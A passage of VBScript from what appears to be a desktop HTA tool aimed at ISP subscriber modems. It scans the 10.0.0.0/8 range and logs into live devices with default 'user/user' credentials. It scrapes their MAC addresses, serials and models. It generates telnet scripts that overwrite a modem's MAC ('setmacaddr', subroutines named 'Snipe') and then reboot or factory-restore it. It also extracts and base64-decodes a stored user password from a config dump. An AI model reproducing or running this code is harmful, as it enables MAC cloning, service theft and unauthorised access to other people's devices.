Source.WriteLine ("WAIT "& chr(34) &"Login:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetUname.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"Password:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetPassowrd.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"setallmacaddr " &currentMac & "\m"& chr(34)&"") 'unstable
Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"setmacaddr " &stableMac & "\m"& chr(34)&"") 'stable
Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"restoredef\m"& chr(34)&"") 'RESTORE
Source.WriteLine ("WAIT "& chr(34) &"restoredef"& chr(34)&"") 'RESTORE
''Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
''uncoment below after test
''Source.WriteLine ("WAIT "& chr(34) &"Connection To"& chr(34)&"")
Source.Close
'changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Create ok..."
set objFSO = Nothing
Set Source = Nothing
End Sub
Sub TstCmnd622i2010RebootSnipe(currentMac,tstInputCmndFile)	
''MsgBox "Inside create Input command"
''changeMACLog.value = "Creating telnet input Command....."
''TextAreaScrollBottom(changeMACLog.name)
'DisplayLogMacGenScan("Creating telnet input Command.....")
set objFSO = createobject("Scripting.FileSystemObject")
Set Source = objFSO.CreateTextFile( tstInputCmndFile, True)
Source.WriteLine (Trim(inputTelnetHost.value))
Source.WriteLine ("WAIT "& chr(34) &"Login:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetUname.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"Password:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetPassowrd.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
''Source.WriteLine ("SEND "& chr(34) &"?\m"& chr(34)&"")
''Source.WriteLine ("WAIT "& chr(34) &"Connection To"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"diag set macaddr " &currentMac & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"diag reboot\m"& chr(34)&"") 'REBOOT
''Source.WriteLine ("WAIT "& chr(34) &"d "& chr(34)&"") 'REBOOT
Source.WriteLine ("WAIT "& chr(34) &"diag reboot"& chr(34)&"") 'REBOOT
''Source.WriteLine ("SEND "& chr(34) &"exit\m"& chr(34)&"") 'EXIT
''Source.WriteLine ("WAIT "& chr(34) &"diag reboot"& chr(34)&"") 'REBOOT
''Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
Source.Close
''changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Create ok..."
'DisplayLogMacGenScan("Create ok...")
set objFSO = Nothing
Set Source = Nothing
End Sub 
Sub TstCmnd622i2010RestoreSnipe(currentMac,tstInputCmndFile)	
''MsgBox "Inside create Input command"
''changeMACLog.value = "Creating telnet input Command....."
''TextAreaScrollBottom(changeMACLog.name)
'DisplayLogMacGenScan("Creating telnet input Command.....")
set objFSO = createobject("Scripting.FileSystemObject")
Set Source = objFSO.CreateTextFile( tstInputCmndFile, True)
Source.WriteLine (Trim(inputTelnetHost.value))
Source.WriteLine ("WAIT "& chr(34) &"Login:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetUname.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"Password:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetPassowrd.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"diag set macaddr " &currentMac & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"diag restore default\m"& chr(34)&"") 'RESTORE
''Source.WriteLine ("SEND "& chr(34) &"exit\m"& chr(34)&"") 'EXIT
Source.WriteLine ("WAIT "& chr(34) &"diag restore default"& chr(34)&"") 'RESTORE
''Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
Source.Close
''changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Create ok..."
'DisplayLogMacGenScan("Create ok...")
set objFSO = Nothing
Set Source = Nothing
End Sub 
Sub TstCmnd622RestoreSnipe(currentMac,tstInputCmndFile)	
'MsgBox "Inside create Input command"
'DisplayLogMacGenScan("Creating telnet input Command.....")
set objFSO = createobject("Scripting.FileSystemObject")
Set Source = objFSO.CreateTextFile( tstInputCmndFile, True)
Source.WriteLine (Trim(inputTelnetHost.value))
Source.WriteLine ("WAIT "& chr(34) &"Login:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetUname.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"Password:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetPassowrd.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"setallmacaddr " &currentMac & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"restoredef\m"& chr(34)&"") 'RESTORE
Source.WriteLine ("WAIT "& chr(34) &"restoredef"& chr(34)&"") 'RESTORE
''Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
''uncoment below after test
'Source.WriteLine ("WAIT "& chr(34) &"Connection To"& chr(34)&"")
Source.Close
'changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Create ok..."
set objFSO = Nothing
Set Source = Nothing
End Sub
Sub TstCmnd621RestoreSnipe(currentMac,tstInputCmndFile)	
'MsgBox "Inside create Input command"
'DisplayLogMacGenScan("Creating telnet input Command.....")
set objFSO = createobject("Scripting.FileSystemObject")
Set Source = objFSO.CreateTextFile( tstInputCmndFile, True)
Source.WriteLine (Trim(inputTelnetHost.value))
Source.WriteLine ("WAIT "& chr(34) &"Login:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetUname.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"Password:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetPassowrd.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"setmacaddr " &currentMac & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"restoredef\m"& chr(34)&"") 'RESTORE
Source.WriteLine ("WAIT "& chr(34) &"restoredef"& chr(34)&"") 'RESTORE
''Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
''uncoment below after test
'Source.WriteLine ("WAIT "& chr(34) &"Connection To"& chr(34)&"")
Source.Close
'changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Create ok..."
set objFSO = Nothing
Set Source = Nothing
End Sub
Sub TstCmnd621RebootSnipe(currentMac,tstInputCmndFile)	
'MsgBox "Inside create Input command"
'DisplayLogMacGenScan("Creating telnet input Command.....")
set objFSO = createobject("Scripting.FileSystemObject")
Set Source = objFSO.CreateTextFile( tstInputCmndFile, True)
Source.WriteLine (Trim(inputTelnetHost.value))
Source.WriteLine ("WAIT "& chr(34) &"Login:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetUname.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"Password:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetPassowrd.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"setmacaddr " &currentMac & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"board reboot\m"& chr(34)&"") 'REBOOT
Source.WriteLine ("WAIT "& chr(34) &"board reboot"& chr(34)&"") 'REBOOT
'Source.WriteLine ("WAIT "& chr(34) &"restoredef"& chr(34)&"") 'RESTORE
''Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
''uncoment below after test
'Source.WriteLine ("WAIT "& chr(34) &"Connection To"& chr(34)&"")
Source.Close
'changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Create ok..."
set objFSO = Nothing
Set Source = Nothing
End Sub
'Sub HideSecurityElements
'        If hideSecurity.style.display="none" Then
'hideSecurity.style.visibility="visible"
'            hideSecurity.style.display = ""
'        Else
' hideSecurity.style.visibility="hidden"
'            hideSecurity.style.display = "none"
'        End If
'    End Sub
Sub RestoreIpAdd
filename = "LastIpScanned.txt"
accountFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
Set fso = CreateObject("Scripting.FileSystemObject")
If fso.FileExists(accountFile)= True Then
Set objFileToRead = CreateObject("Scripting.FileSystemObject").OpenTextFile(accountFile,1)
strFileText = objFileToRead.ReadLine()
objFileToRead.Close
Set objFileToRead = Nothing
MyString = (Trim(strFileText))
MyArray = Split(MyString, "|", -1, 1)
sStartIp = MyArray(0) 
sLastIp = MyArray(1)
InputStartIp.value = sStartIp
InputEndIp.value = sLastIp
If InputStartIp.value = "" Then
InputStartIp.value = "10.0.0.1"
InputEndIp.value = "10.255.255.255"
InputEndIp.style.background = "White"
InputEndIp.style.color = "#000000"
btnStartIpScan.Disabled = True
LogLiveIp.Value = "Status idle...."
DisplayLogIpscan "Unable to restore last IP to be scan...is now restoring defaults..."
currentLiveIp.value = 0
Else
btnStartIpScan.Disabled = False
LogLiveIp.value = "Last IP to be scan restored...."
End If
Else
InputStartIp.value = "10.0.0.1"
InputEndIp.value = "10.255.255.255"
InputEndIp.style.background = "White"
InputEndIp.style.color = "#000000"
btnStartIpScan.Disabled = True
LogLiveIp.Value = "Status idle...."
DisplayLogIpscan "Unable to restore last IP to be scan...is now restoring defaults..."
currentLiveIp.value = 0
End If

End Sub
Sub PasteTextIpAddScan
InputStartIp.value = Trim(document.parentwindow.clipboardData.GetData("text"))
OnKeyUpDownInputIpStartAdd
End Sub	
Sub PasteTextDefaultMac
inputDefaultMAC.value = Trim(document.parentwindow.clipboardData.GetData("text"))
CheckMyDefaultMacIsValid
''OnKeyUpDownInputIpStartAdd
'If btnChangeMacDefault.Disabled = True Then
'MsgBox "forbidden"
'Else
'MsgBox "OK!!"
'End If
End Sub
Sub PasteTextDefaultMacPassword
inputDefaultMACPassword.value = Trim(document.parentwindow.clipboardData.GetData("text"))
''OnKeyUpDownInputIpStartAdd
End Sub
Function GetIpToNumber(ipAdd)
ipToConvert = Trim(ipAdd)
result = IpDot2num(ipToConvert)
GetIpToNumber = result
End Function
Function GetNumToIp(ipAdd)
ipToConvert = Trim(ipAdd)
result = IpNum2dot(ipToConvert)
GetNumToIp = result
End Function
Function IsIpGreater(firstIp,secondIp)
If GetIpToNumber(firstIp)< GetIpToNumber(secondIp)Then
result = True
Else
result = False
End If
IsIpGreater = result
End Function
Sub StopMacProccessing
KillInternetExplorer
DisplayLogMacGenScan( "" & vbCr & vbLf& "PLEASE WAIT while trying to stop the process......" & vbCr & vbLf & "")
hdnStopMacProcess.value = "1" 
End Sub
Sub StopChangeMacOnly
KillInternetExplorer
DisplayLogChangeMAConly( "" & vbCr & vbLf& "PLEASE WAIT while trying to stop the process......" & vbCr & vbLf & "")
hdnStopMacProcess.value = "1" 
End Sub
Sub StopIpScanning
KillInternetExplorer
DisplayLogIpscan( "" & vbCr & vbLf& "PLEASE WAIT while trying to stop the process......" & vbCr & vbLf & "")
hdnStopMacProcess.value = "1" 
End Sub
'shutdown'
Sub GetChkShutDownIpScan
If chkShutDownIpScan.Checked Then
document.all.shutdownIpScanPCLabel.style.background = "red"
Msgbox "Setting Shutdown PC is ENABLED after scan." , 64+4096 , "Shutdown PC?"
' shutdownPCLabel.style.color = "RED"
'shutdownPCLabel.InnerHTML.style.color = "RED"
Else
document.all.shutdownIpScanPCLabel.style.background = ""
Msgbox "Setting Shutdown PC is DISABLED after scan." , 64+4096 , "Shutdown PC?"
End If
End Sub
''
Sub GetChkSmartScan
If chkSmartScan.Checked Then
document.all.smartScanLabel.style.background = "red"
Msgbox "Smart IP user scanning is ENABLED." , 64+4096 , "Scanning Smart IP only?"
' shutdownPCLabel.style.color = "RED"
'shutdownPCLabel.InnerHTML.style.color = "RED"
Else
document.all.smartScanLabel.style.background = ""
Msgbox "Smart IP user scanning is DISABLED." , 64+4096 , "Scanning Smart IP only?"
End If
End Sub
''
Sub GetCurrentLiveIP
MsgBox currentLiveIp.value
End Sub
Sub ScanIpRange
KillInternetExplorer
currentLiveIp.value = 0
If Not IsIpGreater(InputStartIp.value,InputEndIp.value) Then
btnStartIpScan.Disabled = True
MsgBox "The STARTING IP should be lower than the ENDING IP!!"
Exit Sub
End If
''LogLiveIp.Value = "Status idle...."
LogLiveIp.Value = "Operation started.......Please wait...."
''
If radiobtnWebUserCus.Checked Then
DisplayLogIpscan "WEB USER ACCOUNT USED:" 
DisplayLogIpscan "USER: "& Trim(inputWebUserUname.value)  
DisplayLogIpscan "PASSWORD: "& Trim(inputWebUserPassowrd.value)
DisplayLogIpscan ""
Else
DisplayLogIpscan "WEB USER ACCOUNT USED:" 
DisplayLogIpscan "USER: user"   
DisplayLogIpscan "PASSWORD: user"
DisplayLogIpscan ""
End If
''
If chkSmartScan.Checked Then
	DisplayLogIpscan "Scanning mode: SMART IP user's only" & vbCr & vbLf
Else
	DisplayLogIpscan "Scanning mode: Globe IP user's only" & vbCr & vbLf
End If 
''
Dim NewIP,fso 
NewIp = Trim(InputStartIp.value)
LastIp = IncIp(Trim(InputEndIp.value))
stopAtIpAdd = LastIp
hdnStopMacProcess.value = "0"  'set stop process to 0 to continue
hdnStopProcessResult.value = "0"
'saveWebPageToFile =  "savePage.txt"
Do 
'MsgBox NewIP
''DisplayLogIpscan "============================================= "
''DisplayLogIpscan vbCr & vbLf & "Scanning...... " & NewIp 
pingCountTest = 0
Do 
pingResult = False
pingResult = PingIpToScanCMD(NewIp)
Sleeper 500
''DisplayLogIpscan "pingresult:" & pingResult
pingCountTest = pingCountTest + 1
''DisplayLogIpscan pingCountTest
If pingResult Then
''Exit Sub
''DisplayLogIpscan  NewIP & "........ is ALIVE!"
startScanIP NewIp
Else
If pingCountTest > CInt(scanIPTryList.value) Then
''If pingCountTest > 1 Then
''isplayLogIpscan "test value: " &liveIPTryList.value
DisplayLogIpscan  NewIP & "........ is DEAD!"
Exit Do
End If
End If
'If pingCountTest > 2 Then
'Exit Do
'End If
If hdnStopMacProcess.value = "1" Then
Sleeper(1000)
hdnStopProcessResult.value = "1"
CreateSaveLastIpScan(NewIP)
DisplayLogIpscan(vbCr & vbLf & "Stopping process....Ok!")
Exit Sub
End If
Loop While Not pingResult
pingCountTest = 0
NewIp = IncIp(NewIp) 
'populateCurrentLiveIpScan 
Sleeper 500 ''3000
If hdnStopMacProcess.value = "1" Then
Sleeper(1000)
hdnStopProcessResult.value = "1"
CreateSaveLastIpScan(NewIP)
DisplayLogIpscan(vbCr & vbLf & "Stopping process....Ok!")
Exit Sub
End If
Loop Until NewIP = stopAtIpAdd
CreateSaveLastIpScan(NewIP)
DisplayLogIpscan vbCr & vbLf & "Scanning IP Address FINISHED......" 
DisplayLogIpscan "Go to TAB MENU ""MAC TABLE/LIST"") to view Live IP scan result."
''DisplayLogIpscan "Click/Press ""VIEW LOG FILE"" button to VIEW log/error result on IP SCANNING."
hdnStopProcessResult.value = "1"
KillInternetExplorer
If chkShutDownIpScan.Checked Then
ShutdownPC
Else 
MsgBox "To VIEW log/error result on IP SCANNING." & vbCr & vbLf & vbCr & vbLf & "Press PRESS/CLICK ""VIEW LOG FILE"" button.",64, "IP Scanning is FINISHED...."
End If
End Sub
Sub startScanIP(ipadd)
'If PingIpToScan(NewIp) Then
'If  PingSite(ipadd) Then
''begin if stop by user
If hdnStopMacProcess.value = "1" Then
Sleeper 1000
hdnStopProcessResult.value = "1"
DisplayLogIpscan("Stopping process....Ok!")
KillInternetExplorer
Exit Sub
End If
''end if stop
DisplayLogIpscan  ipadd & ".... Checking please wait......"
ClearSaveWebPage("savePage.txt")
''ScanIP(ipadd)
''If	CountLineIpScan > 1 Then
If chkSmartScan.Checked Then
	If	ScanIPgetMacSmart(ipadd) Then
	''SaveInfoOfIPUsingRegSmart ipadd,"IpInfo.txt"
	Sleeper 1000
	''ClearSaveWebPage("savePage.txt")
	''Else
	''DisplayLogIpscan ipadd & ".... is taking TOO LONG to respond. Connection is LOST!..."
	End If
Else
	If	ScanIPgetMac(ipadd) Then
	SaveInfoOfIPUsingReg ipadd,"IpInfo.txt"
	Sleeper 1000
	ClearSaveWebPage("savePage.txt")
	''Else
	''DisplayLogIpscan ipadd & ".... is taking TOO LONG to respond. Connection is LOST!..."
	End If
End If
'End If
End Sub 
Sub SaveInfoOfIPUsingReg(ipAdd,filenameToSave)
saveToFile = "NA"
saveToFile = GetFullMAC
'saveToFile = saveToFile &"|"& GetSerial
''textFilePath = filenameToSave'"IpInfo.txt"
filename = filenameToSave
textFilePath = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
If MacIsInTheList(textFilePath,saveToFile) = True Then
DisplayLogIpscan "APPEND MAC FAILED: Live IP MAC is already in the list......"
Exit Sub
End if
saveToFile = saveToFile &"|"& ipAdd
''Wscript.Echo saveToFile
''ipaddressInfo = ipAdd &"|"& saveToFile &"|"& "0 Mbps"
''ipaddressInfo = saveToFile &"|"&  GetSerial&"|"& "0 Mbps"
ipaddressInfo = saveToFile &"|"&  GetSerial&"|"& GetDeviceModel
appendIpToFile ipaddressInfo,filenameToSave
currentLiveIp.value = currentLiveIp.value + 1
populateCurrentLiveIpScan
''DisplayLogIpscan "Processing......" & ipAdd & ". Success!!!(Saved in TAB MENU ""MAC TABLE/LIST"")"
DisplayLogIpscan ipAdd & "........ Process SUCCESS!!!(Saved in TAB MENU ""MAC TABLE/LIST"")"
End Sub
''
''
Sub SaveInfoOfIPUsingRegSmart(ipAdd,filenameToSave,stringMACInfo)
saveToFile = "NA"
getSerialSmart = "NA"
getDeviceModelSmart = "Smart GP"
''If stringMACInfo
saveToFile = stringMACInfo ''GetFullMACsmart(stringMACInfo)
'saveToFile = saveToFile &"|"& GetSerial
''textFilePath = filenameToSave'"IpInfo.txt"
filename = filenameToSave
textFilePath = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
If MacIsInTheList(textFilePath,saveToFile) = True Then
DisplayLogIpscan "APPEND MAC FAILED: Live IP MAC is already in the list......"
Exit Sub
End if
saveToFile = saveToFile &"|"& ipAdd
''Wscript.Echo saveToFile
''ipaddressInfo = ipAdd &"|"& saveToFile &"|"& "0 Mbps"
''ipaddressInfo = saveToFile &"|"&  GetSerial&"|"& "0 Mbps"
ipaddressInfo = saveToFile &"|"&  getSerialSmart &"|"& getDeviceModelSmart
appendIpToFile ipaddressInfo,filenameToSave
currentLiveIp.value = currentLiveIp.value + 1
populateCurrentLiveIpScan
''DisplayLogIpscan "Processing......" & ipAdd & ". Success!!!(Saved in TAB MENU ""MAC TABLE/LIST"")"
DisplayLogIpscan ipAdd & "........ Process SUCCESS!!!(Saved in TAB MENU ""MAC TABLE/LIST"")"
End Sub
''
''Begin readUpdateFile CODE
Function updateCheckReadFileResult
stringToPattern = base64decode("UFVCUExJQyBWRVJTSU9OOnl5eXh5eXl6")
''DisplayLogIpscan "Trying to get Device Model...." 
Set objFS = CreateObject("Scripting.FileSystemObject")
Set objRegExp = new RegExp
''PUBPLIC VERSION:yyyxyyyz
objRegExp.Pattern = stringToPattern '' "BM62[0-9a-zA-Z]"
filename = "newUpdateVersion.txt"
textFilePath = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
Set objFile = objFS.OpenTextFile(textFilePath)
stringToSplit =""
Do Until objFile.AtEndOfStream
strSearchString = objFile.ReadLine
Set colMatches = objRegExp.Execute(strSearchString)  
If colMatches.Count > 0 Then
For Each strMatch in colMatches   
stringToSplit = strSearchString
'MyArray = Split(strSearchString, ":", -1, 1)
'stringToSplit = MyArray(2)
Next
End If
Loop
''
objFile.Close

If stringToSplit = "" Then
fullCurrentMAc = "NOUPDATE"
ProtocolTesting
Else 
fullCurrentMAc = stringToSplit
End If
''MsgBox fullCurrentMAc
updateCheckReadFileResult = fullCurrentMAc
End Function
''
''End readUpdateFile CODE
''
''
''
''Begin Get txtmyt CODE
Function GetTxtMytCode
''DisplayLogIpscan "Trying to get Device Model...." 
Set objFS = CreateObject("Scripting.FileSystemObject")
Set objRegExp = new RegExp
objRegExp.Pattern = "Code:[0-9]" '' "BM62[0-9a-zA-Z]"
filename = "txtMytSecurityCode.txt"
textFilePath = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
Set objFile = objFS.OpenTextFile(textFilePath)
stringToSplit =""
Do Until objFile.AtEndOfStream
strSearchString = objFile.ReadLine
Set colMatches = objRegExp.Execute(strSearchString)  
If colMatches.Count > 0 Then
For Each strMatch in colMatches   
''stringToSplit = strSearchString
MyArray = Split(strSearchString, "<BR>", -1, 1)
stringToSplit = MyArray(3)
Next
End If
Loop
''
objFile.Close
ClearSaveWebPage("txtMytSecurityCode.txt")
MyString = (Trim(stringToSplit))
If MyString = "" Then
fullCurrentMAc = "NOT FOUND"
Else 
MyArray = Split(MyString,"<SMALL", -1, 1)
''fullCurrentMAc = MyArray(0) 
MyArrayCode = Split(MyArray(0),":", -1, 1)
fullCurrentMAc = MyArrayCode(1) 
End If
''MsgBox fullCurrentMAc
GetTxtMytCode = fullCurrentMAc
End Function
''
''End Get txtmyt CODE
''
''
Function GetDeviceModel
''DisplayLogIpscan "Trying to get Device Model...." 
Set objFS = CreateObject("Scripting.FileSystemObject")
Set objRegExp = new RegExp
objRegExp.Pattern = "BM62[0-9a-zA-Z]"
filename = "savePage.txt"
textFilePath = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
Set objFile = objFS.OpenTextFile(textFilePath)
'strFileContents = objFile.ReadAll
'arrLines = Split(strFileContents,vbNewLine)
'For Each strLine in arrLines
'Set colMatches = objRegExp.Execute(strLine)
'For Each strMatch in colMatches
'fullCurrentMAc  = UCase(strMatch)
''MsgBox fullCurrentMAc
'Next
'Next
''
stringToSplit =""
Do Until objFile.AtEndOfStream
strSearchString = objFile.ReadLine
''
''	MsgBox strSearchString
foundStringIn = InStr(10,strSearchString,"BM6")
''MsgBox foundStringIn
If foundStringIn <> 0 Then
stringFound  = Mid(strSearchString,foundStringIn,6)
stringToSplit = stringFound
Exit Do
End If
''	Exit do
''
'	Set colMatches = objRegExp.Execute(strSearchString)  
'	If colMatches.Count > 0 Then
'	For Each strMatch in colMatches   
'	stringToSplit = strSearchString
'	Next
'	End If
Loop
''
objFile.Close
MyString = (Trim(stringToSplit))
If MyString = "" Then
fullCurrentMAc = "NOT FOUND"
Else 
MyArray = Split(MyString," ", -1, 1)
fullCurrentMAc = MyArray(0) 
End If
''MsgBox fullCurrentMAc
GetDeviceModel = Trim(fullCurrentMAc)
End Function
''
''BegingetDeviceModelTestIpScanning
Function GetDeviceModelIpScanning
''DisplayLogIpscan "Trying to get Device Model...." 
Set objFS = CreateObject("Scripting.FileSystemObject")
Set objRegExp = new RegExp
objRegExp.Pattern = "BM62[0-9a-zA-Z]"
filename = "savePageLoginForm.txt"
textFilePath = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
Set objFile = objFS.OpenTextFile(textFilePath)
stringToSplit =""
Do Until objFile.AtEndOfStream
strSearchString = objFile.ReadLine
''
''	MsgBox strSearchString
foundStringIn = InStr(10,strSearchString,"BM6")
''MsgBox foundStringIn
If foundStringIn <> 0 Then
stringFound  = Mid(strSearchString,foundStringIn,6)
stringToSplit = stringFound
Exit Do
End If
Loop
''
objFile.Close
MyString = (Trim(stringToSplit))
If MyString = "" Then
fullCurrentMAc = "NOT FOUND"
Else 
MyArray = Split(MyString," ", -1, 1)
fullCurrentMAc = MyArray(0) 
End If
''MsgBox fullCurrentMAc
GetDeviceModelIpScanning = Trim(fullCurrentMAc)
End Function
''
''End getDeviceModelTestIpScanning
''
Function GetSerial
''DisplayLogIpscan "Trying to get SERIAL...." 
Set objFS = CreateObject("Scripting.FileSystemObject")
Set objRegExp = new RegExp
objRegExp.Pattern = "[0-9a-zA-Z]{6}-.*[0-9a-zA-Z]"
filename = "savePage.txt"
textFilePath = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
Set objFile = objFS.OpenTextFile(textFilePath)
strFileContents = objFile.ReadAll
arrLines = Split(strFileContents,vbNewLine)
For Each strLine in arrLines
Set colMatches = objRegExp.Execute(strLine)
For Each strMatch in colMatches
fullCurrentMAc  = UCase(strMatch)
'MsgBox fullCurrentMAc
Next
Next
objFile.Close
MyString = (Trim(fullCurrentMAc))
If MyString = "" Then
fullCurrentMAc = "NOT FOUND"
Else 
MyArray = Split(MyString," ", -1, 1)
fullCurrentMAc = MyArray(0) 
End If

'MsgBox fullCurrentMAc
GetSerial = fullCurrentMAc
End Function
Function GetFullMAC
''DisplayLogIpscan "Trying to get MAC...." 
Set objFS = CreateObject("Scripting.FileSystemObject")
Set objRegExp = new RegExp
objRegExp.Pattern = "([0-9A-F]{2}[:-]){5}([0-9A-F]{2})"
filename = "savePage.txt"
textFilePath = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
Set objFile = objFS.OpenTextFile(textFilePath)
strFileContents = objFile.ReadAll
arrLines = Split(strFileContents,";")
Dim myArray(1)
macCount = 0
For Each strLine in arrLines
Set colMatches = objRegExp.Execute(strLine)
For Each strMatch in colMatches
myArray(macCount) = UCase(strMatch)
macCount = macCount + 1
Next
''
If macCount = 2 Then
Exit For
End If
'' 
Next
objFile.Close
If myArray(0) = "" Then
myArray(0) = "NOT FOUND"
End If 
If myArray(1) = "" Then
myArray(1) = "NOT FOUND"
End If 
fullCurrentMAc = myArray(0) &"|"& myArray(1)

GetFullMAC = fullCurrentMAc
End Function
''
''
Function GetFullMACsmart(stringDeviceInfo)
''DisplayLogIpscan "Trying to get MAC...." 
Set objFS = CreateObject("Scripting.FileSystemObject")
Set objRegExp = new RegExp
objRegExp.Pattern = "([0-9A-F]{2}[:-]){5}([0-9A-F]{2})"
''filename = "savePage.txt"
''textFilePath = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
''Set objFile = objFS.OpenTextFile(textFilePath)
''strFileContents = objFile.ReadAll
strFileContents = stringDeviceInfo
arrLines = Split(strFileContents,";")
Dim myArray(1)
macCount = 0
For Each strLine in arrLines
Set colMatches = objRegExp.Execute(strLine)
For Each strMatch in colMatches
myArray(macCount) = UCase(strMatch)
macCount = macCount + 1
Next
''
If macCount = 2 Then
Exit For
End If
'' 
Next
''objFile.Close
If myArray(0) = "" Then
myArray(0) = "NOT FOUND"
End If 
If myArray(1) = "" Then
myArray(1) = "NOT FOUND"
End If 
fullCurrentMAc = myArray(1) &"|"& myArray(0)
''MsgBox fullCurrentMAc
GetFullMACsmart = fullCurrentMAc
End Function
''
''Begin get pass 622 2011
Function GetBM6222011PassFromFile
''DisplayLogIpscan "Trying to get Device Model...." 
Set objFS = CreateObject("Scripting.FileSystemObject")
'Set objRegExp = new RegExp
'objRegExp.Pattern = "BM62[0-9a-zA-Z]"
filename = "TelnetOutPutCmndGetPass.txt"
textFilePath = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
Set objFile = objFS.OpenTextFile(textFilePath)
stringToSplit =""
'stringFound = ""
'foundStringInStart = 0
'foundStringInEnd = 0
Do Until objFile.AtEndOfStream
strSearchString = objFile.ReadLine
''
''MsgBox strSearchString
''& chr(34) &"\m"& chr(34)&""
foundStringInStart = InStr(1,strSearchString,"<X_ATP_UserInfoInstance InstanceID="& chr(34) &"1"& chr(34)&"")
''foundStringInEnd = InStr(10,strSearchString,"Userlevel")
''MsgBox foundStringInStart
''MsgBox foundStringInStart
''MsgBox foundStringInEnd
If foundStringInStart <> 0 Then
''MsgBox foundStringInStart
''lengthString = foundStringInEnd - foundStringInStart
''MsgBox strSearchString
stringFound  = Mid(strSearchString,foundStringInStart,103)
stringToSplit = stringFound
Exit Do
End If

Loop
''
objFile.Close

foundFinalPasswordStart = InStr(1,stringToSplit,"Userpassword")
stringToSplit  = Mid(stringToSplit,foundFinalPasswordStart,50)


''fullCurrentMAc = stringToSplit
MyString = (Trim(stringToSplit))
If MyString = "" Then
fullCurrentMAc = "NOT FOUND"
Else 
MyArray = Split(MyString,chr(34), -1, 1)
fullCurrentMAc = MyArray(1) 
fullCurrentMAc = base64decode(Trim(fullCurrentMAc))
End If
''MsgBox fullCurrentMAc
Getbm6222011PassFromFile = fullCurrentMAc
End Function
''End get pass 622 2011
''
Sub appendIpToFile(ipaddressInfo,ipFileName)
Dim textFilePath,objFSO,newbaseMac,objTextFile
const ForAppending = 8
''textFilePath = ipFileName ' "IPGenList.txt"
filename = ipFileName
textFilePath = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
set objFSO = createobject("Scripting.FileSystemObject")
'newbaseMac =  getBaseMac()
If (objFSO.FileExists(textFilePath)) Then
set objTextFile = objFSO.opentextfile(textFilePath,ForAppending)
